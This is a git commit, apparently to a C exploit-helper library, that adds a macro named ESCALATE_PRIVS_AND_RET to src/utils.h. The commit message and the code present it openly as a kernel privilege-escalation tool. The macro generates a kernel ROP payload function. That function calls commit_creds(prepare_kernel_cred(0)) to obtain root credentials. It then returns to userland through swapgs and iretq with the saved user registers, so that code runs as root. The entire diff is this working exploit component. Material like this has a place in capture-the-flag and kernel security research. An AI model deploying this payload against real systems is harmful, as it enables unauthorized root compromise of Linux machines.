d68bf06bb7b9a42979621e5fa9d56f4e1eb3ac64
itskarudo <itskarudo@protonmail.com>
2023-10-20 11:25:28 +0100

    Utils: Add ESCALATE_PRIVS_AND_RET macro
    this macro generates a function that can be used in kernel ROP when SMEP
    is disabled, this function would call
    `commit_creds(prepare_kernel_cred(0))` to escalate privileges and return
    to a userland function where a user can execute code as root.

--- src/utils.h
+++ src/utils.h
@@ -14,3 +14,29 @@ Bytes *flat(const Bytes *, ...);
 Bytes *b_mul(const Bytes *, size_t n);
 Bytes * xor (const Bytes *, ...);
 uint64_t posmod(int64_t i, int64_t n);
+
+#define ESCALATE_PRIVS_AND_RET(func, state, pkc, cc, ret)                      \
+  void func(void) {                                                            \
+    void *(*prepare_kernel_cred)(void *) = (void *(*)(void *))pkc;             \
+    void (*commit_creds)(void *) = (void (*)(void *))cc;                       \
+                                                                               \
+    commit_creds(prepare_kernel_cred(0));                                      \
+                                                                               \
+    __asm__ __volatile__(".intel_syntax noprefix;"                             \
+                         "swapgs;"                                             \
+                         "mov r15, %0;"                                        \
+                         "push r15;"                                           \
+                         "mov r15, %1;"                                        \
+                         "push r15;"                                           \
+                         "mov r15, %2;"                                        \
+                         "push r15;"                                           \
+                         "mov r15, %3;"                                        \
+                         "push r15;"                                           \
+                         "mov r15, %4;"                                        \
+                         "push r15;"                                           \
+                         "iretq;"                                              \
+                         ".att_syntax;"                                        \
+                         :                                                     \
+                         : "r"(state.ss), "r"(state.sp), "r"(state.flags),     \
+                           "r"(state.cs), "r"(ret));                           \
+  }
